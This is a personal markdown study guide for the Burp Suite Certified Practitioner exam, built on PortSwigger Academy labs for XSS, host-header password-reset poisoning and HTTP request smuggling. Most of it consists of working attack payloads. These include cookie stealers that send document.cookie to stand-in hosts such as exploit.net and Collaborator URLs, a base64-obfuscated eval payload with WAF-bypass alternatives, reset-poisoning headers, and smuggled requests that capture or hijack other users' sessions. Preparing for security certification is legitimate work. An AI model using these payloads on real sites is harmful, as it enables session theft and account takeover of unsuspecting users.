
# Burp-Suite-Certified-Practitioner-Exam-Study
My personal study notes on the PortSwigger Academy Burp Suite Certified Practitioner Exam topics.  

[Cross Site Scripting](#cross-site-scripting)  
[Host Header Poison - forgot-password](#host-header-poison---forgot-password)  
[HTTP Request Smuggling](#http-request-smuggling)  


## Cross Site Scripting

+ [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+ [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  

### Cookie Stealers

### Reflected XSS in Search with WAF
>Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
<sub>WAF is preventing dangerous search filters and tags!</sub>
```JavaScript
fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
```
<sup>Base64 encode the payload</sup>
```
ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk=
```
<sub>Test payload on our own session in Search</sub>
```JavaScript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```  

+ Using the **eval()** method evaluates or executes an argument. 
+ Using **atob()** or **btoa()** is function used for encoding to and from base64 formated strings.
+ If **eval()** being blocked then Alternatives:
  + setTimeout("code")
  + setInterval("code)
  + setImmediate("code")
  + Function("code")()
  

![This image show after entering the above into search and the collaborator receiving request with base64 cookie value from us.](xss1.png)  

>Hosting the **IFRAME** with eval() and fetch() payload on web exploit server, respectively base64 encoded and URL encoded.  

```html
<iframe src="https://TARGET.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
```
![(Deliver reflected xss to steal victim cookie.](deliver-reflected-xss-to-steal-victim-cookie.png)

### Reflected XSS in Search with blocked Tags
>Reflected XSS into HTML context with most tags and attributes blocked Bypass WAF
<sup>Body and event **'onresize'** is only allowed</sup>
```JavaScript
?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
<sup>Body and event **'onpopstate'** is only allowed</sup>
```JavaScript
?search=%22%3E%3Cbody%20onpopstate=print()>
```
[onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  

[Methodology to identify allowed tags and events - PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  

#### URL and Base64 online encoders and decoders  
[URL Decode and Encode](https://www.urldecoder.org/)  
[BASE64 Decode and Encode](https://www.base64encode.org/)    
  
### Stored XSS

#### Blog post comment section
```html
<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
```  

#### Product and Store lookup
```html
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
```  

#### Stored XSS Blog post
```JavaScript
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```  

#### Fetch API Cookie Stealer in blog comment
```JavaScript
<script>
fetch('https://exploit.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```  

## Host Header Poison - forgot-password

### Authentication

### Spoof IP Address
>Identify that the alternate HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
  
<sub>Change the username parameter to carlos and send the request.</sub>
```html
X-Forwarded-Host: EXPLOIT-SERVER-ID.exploit-server.net
X-Host: EXPLOIT-SERVER-ID.exploit-server.net
X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
```
<sup>Check the exploit server log to obtain the reset link to the victim username.</sup>
  
![Exploit Server Logs capture the forgot password reset token](HOST-Header-forgot-password-reset.PNG)  

[PortSwigger Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  

## HTTP Request Smuggling

>Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding(HEX) or content-length(Decimal).  Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.
  
<sub>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **hexadecimal**, and _ _Content-Length_ _ specifies the length of the message body in **bytes**. Chunk consists are followed by a **newline**, followed by the chunk contents. The message is terminated with a chunk of size zero.</sub>   

### Content-Length Capture victim requests

>Sending a POST request with smuggled request but the content length is longer than the real length and when victim browse their cookie session value is posted to blob comment. Increased the comment-post request's Content-Length to 850, then smuggle it to the back-end server.

```html
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 850
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40mail.net&website=&comment=test
```
>View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.
  
![Exploiting HTTP request smuggling to capture other users' requests](request-smuggling-cookie-stealer.PNG)  

[PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  

### User-Agent Cookie Stealer

>Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value in smuggled request.  

<sup>Basic Cross Site Scripting Payload</sup>  

```JavaScript
 "/><script>alert(1)</script>
```

<sub>COOKIE STEALER Payload</sub>  

```JavaScript
a"/><script>document.location='http://Collaborator.oastify.com/cookiestealer.php?c='+document.cookie;</script>
```  

>Smuggle this XSS request to the back-end server, so that it exploits the next visitor.  

```html
POST / HTTP/1.1
Host: 0acc008e03af84c3c0274fe0004e00d4.web-security-academy.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://j0kk3reuzdhg8gslbbcrqwdtnktbh15q.oastify.com/?Hack='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```  

![HTTP request smuggling to deliver reflected XSS and steal victim cookie](user-agent-cookie-stealer-smuggled.PNG)  

>Check the PortSwigger Collaborator Request received from victim browsing target.  
  
![Collaborator capture xss Request from victim browsing target](collaborator-xss-Request-received.png)  

[PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  

>If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  

